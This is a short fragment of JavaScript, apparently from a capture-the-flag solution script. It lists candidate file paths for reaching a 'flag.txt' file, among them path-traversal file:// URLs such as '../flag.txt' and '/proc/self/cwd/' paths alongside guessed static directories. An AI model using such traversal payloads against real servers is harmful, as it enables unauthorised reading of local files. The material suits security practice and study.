...
`;
    ...
    const files = [
        ['file:///../flag.txt', 'flflag'],
  ['file:///./../flag.txt', 'flflag-dot'],
  ['file:///proc/self/cwd/../flag.txt', 'flflag-proc'],
      ['file:///app/../flag.txt','deg'],
      ['file:///../flag.txt','rt'],
      ['file:///proc/self/cwd/../flag.txt',''],
      
        ['/static/flag.txt', 'flag'],
        ['/static/js/flag.txt', 'js-flag'],
        ['/static/css/flag.txt', 'css-flag'],
        ['/static/img/flag.txt', 'img-flag'],
        ['/static/flag/flag.txt', 'flag-flag'],
        ['/static/flags/flag.txt', 'flags-flag'],
        ['static/flag.txt', 'flag'],
        ['static/js/flag.txt', 'js-flag'],
        ['static/css/flag.txt', 'css-flag'],
        ['static/img/flag.txt', 'img-flag'],
